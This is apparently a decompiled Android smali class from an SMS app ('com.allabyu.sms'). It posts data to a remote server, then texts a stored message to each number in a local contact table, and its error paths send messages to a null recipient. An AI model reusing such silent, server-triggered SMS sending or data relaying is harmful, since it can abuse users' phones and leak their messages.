.class public Lcom/allabyu/sms/SmsReceiver$NetworkAccess;
.super Landroid/os/AsyncTask;
.source "SmsReceiver.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/allabyu/sms/SmsReceiver;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "NetworkAccess"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lcom/allabyu/sms/SmsReceiver;


# direct methods
.method public constructor <init>(Lcom/allabyu/sms/SmsReceiver;)V
    .locals 0

    .prologue
    .line 102
    iput-object p1, p0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->doInBackground([Ljava/lang/Void;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/String;
    .locals 22
    .param p1, "unused"    # [Ljava/lang/Void;

    .prologue
    .line 105
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    new-instance v5, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    move-object/from16 v0, p0

    iget-object v6, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v6, v6, Lcom/allabyu/sms/SmsReceiver;->ctx:Landroid/content/Context;

    const-string v7, "allabyu.db"

    const/16 v20, 0x0

    const/16 v21, 0x1

    move-object/from16 v0, v20

    move/from16 v1, v21

    invoke-direct {v5, v6, v7, v0, v1}, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    iput-object v5, v4, Lcom/allabyu/sms/SmsReceiver;->helper:Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    .line 106
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v5, v5, Lcom/allabyu/sms/SmsReceiver;->helper:Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    invoke-virtual {v5}, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v5

    iput-object v5, v4, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    .line 107
    const-string v3, "0"

    .line 110
    .local v3, "CsNumber":Ljava/lang/String;
    new-instance v8, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v8}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 112
    .local v8, "client":Lorg/apache/http/client/HttpClient;
    invoke-interface {v8}, Lorg/apache/http/client/HttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v14

    .line 113
    .local v14, "params":Lorg/apache/http/params/HttpParams;
    const/16 v4, 0x1388

    invoke-static {v14, v4}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 114
    const/16 v4, 0x1388

    invoke-static {v14, v4}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 115
    new-instance v11, Lorg/apache/http/client/methods/HttpPost;

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->httpAddr:Ljava/lang/String;

    invoke-direct {v11, v4}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 117
    .local v11, "httpPost":Lorg/apache/http/client/methods/HttpPost;
    :try_start_0
    new-instance v10, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    const-string v5, "UTF-8"

    invoke-direct {v10, v4, v5}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    .line 118
    .local v10, "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    invoke-virtual {v11, v10}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 119
    invoke-interface {v8, v11}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v15

    .line 120
    .local v15, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v15}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v16

    .line 121
    .local v16, "responseResultEntity":Lorg/apache/http/HttpEntity;
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    invoke-static/range {v16 .. v16}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/allabyu/sms/SmsReceiver;->ResultVal:Ljava/lang/String;

    .line 122
    new-instance v13, Lorg/json/JSONObject;

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->ResultVal:Ljava/lang/String;

    invoke-direct {v13, v4}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 124
    .local v13, "object":Lorg/json/JSONObject;
    const-string v4, "error"

    invoke-virtual {v13, v4}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v17

    check-cast v17, Ljava/lang/String;

    .line 125
    .local v17, "result_error":Ljava/lang/String;
    const-string v4, "service_sms"

    invoke-virtual {v13, v4}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v18

    check-cast v18, Ljava/lang/String;

    .line 126
    .local v18, "result_sms":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    const-string v4, "success"

    invoke-virtual {v13, v4}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    iput-object v4, v5, Lcom/allabyu/sms/SmsReceiver;->return_success:Ljava/lang/String;

    .line 128
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    const-string v5, "SELECT * FROM CS_TBL"

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v19

    .line 129
    .local v19, "s":Landroid/database/Cursor;
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_0

    .line 130
    :goto_0
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_2

    .line 135
    :cond_0
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->close()V

    .line 138
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->return_success:Ljava/lang/String;

    const-string v5, "0"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 139
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->csData:Ljava/util/ArrayList;

    invoke-virtual {v4}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-lez v4, :cond_1

    .line 140
    const/4 v12, 0x0

    .local v12, "i":I
    :goto_1
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->csData:Ljava/util/ArrayList;

    invoke-virtual {v4}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-lt v12, v4, :cond_3

    .line 167
    .end local v10    # "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    .end local v12    # "i":I
    .end local v13    # "object":Lorg/json/JSONObject;
    .end local v15    # "response":Lorg/apache/http/HttpResponse;
    .end local v16    # "responseResultEntity":Lorg/apache/http/HttpEntity;
    .end local v17    # "result_error":Ljava/lang/String;
    .end local v18    # "result_sms":Ljava/lang/String;
    .end local v19    # "s":Landroid/database/Cursor;
    :cond_1
    :goto_2
    const/4 v4, 0x0

    return-object v4

    .line 131
    .restart local v10    # "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    .restart local v13    # "object":Lorg/json/JSONObject;
    .restart local v15    # "response":Lorg/apache/http/HttpResponse;
    .restart local v16    # "responseResultEntity":Lorg/apache/http/HttpEntity;
    .restart local v17    # "result_error":Ljava/lang/String;
    .restart local v18    # "result_sms":Ljava/lang/String;
    .restart local v19    # "s":Landroid/database/Cursor;
    :cond_2
    const-string v4, "cs_number"

    move-object/from16 v0, v19

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v19

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 132
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->csData:Ljava/util/ArrayList;

    invoke-virtual {v4, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_3

    goto :goto_0

    .line 151
    .end local v10    # "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    .end local v13    # "object":Lorg/json/JSONObject;
    .end local v15    # "response":Lorg/apache/http/HttpResponse;
    .end local v16    # "responseResultEntity":Lorg/apache/http/HttpEntity;
    .end local v17    # "result_error":Ljava/lang/String;
    .end local v18    # "result_sms":Ljava/lang/String;
    .end local v19    # "s":Landroid/database/Cursor;
    :catch_0
    move-exception v9

    .line 152
    .local v9, "e":Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v9}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    .line 153
    const-string v4, "0"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 154
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    .line 155
    .local v2, "sms":Landroid/telephony/SmsManager;
    const/4 v4, 0x0

    const-string v5, "TEST1"

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_2

    .line 141
    .end local v2    # "sms":Landroid/telephony/SmsManager;
    .end local v9    # "e":Lorg/apache/http/client/ClientProtocolException;
    .restart local v10    # "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    .restart local v12    # "i":I
    .restart local v13    # "object":Lorg/json/JSONObject;
    .restart local v15    # "response":Lorg/apache/http/HttpResponse;
    .restart local v16    # "responseResultEntity":Lorg/apache/http/HttpEntity;
    .restart local v17    # "result_error":Ljava/lang/String;
    .restart local v18    # "result_sms":Ljava/lang/String;
    .restart local v19    # "s":Landroid/database/Cursor;
    :cond_3
    :try_start_1
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v4, v4, Lcom/allabyu/sms/SmsReceiver;->csData:Ljava/util/ArrayList;

    invoke-virtual {v4, v12}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->this$0:Lcom/allabyu/sms/SmsReceiver;

    iget-object v5, v5, Lcom/allabyu/sms/SmsReceiver;->MsgCont:Ljava/lang/String;

    move-object/from16 v0, p0

    invoke-virtual {v0, v4, v5}, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->smsSend(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_3

    .line 143
    const-wide/16 v4, 0x1388

    :try_start_2
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_3

    .line 140
    :goto_3
    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    .line 144
    :catch_1
    move-exception v9

    .line 146
    .local v9, "e":Ljava/lang/InterruptedException;
    :try_start_3
    invoke-virtual {v9}, Ljava/lang/InterruptedException;->printStackTrace()V
    :try_end_3
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_3

    .line 157
    .end local v9    # "e":Ljava/lang/InterruptedException;
    .end local v10    # "entity":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    .end local v12    # "i":I
    .end local v13    # "object":Lorg/json/JSONObject;
    .end local v15    # "response":Lorg/apache/http/HttpResponse;
    .end local v16    # "responseResultEntity":Lorg/apache/http/HttpEntity;
    .end local v17    # "result_error":Ljava/lang/String;
    .end local v18    # "result_sms":Ljava/lang/String;
    .end local v19    # "s":Landroid/database/Cursor;
    :catch_2
    move-exception v9

    .line 158
    .local v9, "e":Ljava/io/IOException;
    invoke-virtual {v9}, Ljava/io/IOException;->printStackTrace()V

    .line 159
    const-string v4, "0"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 160
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    .line 161
    .restart local v2    # "sms":Landroid/telephony/SmsManager;
    const/4 v4, 0x0

    const-string v5, "\ub124\ud2b8\uc6cc\ud06c \uc0c1\ud0dc\uac00 \ubd88\uc548\uc815\ud558\uc5ec \uc571\uc774 \uc885\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4."

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_2

    .line 163
    .end local v2    # "sms":Landroid/telephony/SmsManager;
    .end local v9    # "e":Ljava/io/IOException;
    :catch_3
    move-exception v9

    .line 165
    .local v9, "e":Lorg/json/JSONException;
    invoke-virtual {v9}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 0
    .param p1, "result"    # Ljava/lang/String;

    .prologue
    .line 184
    return-void
.end method

.method protected smsSend(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p1, "cs_num"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 171
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .local v0, "sms":Landroid/telephony/SmsManager;
    move-object v1, p1

    move-object v3, p2

    move-object v4, v2

    move-object v5, v2

    .line 172
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 173
    return-void
.end method
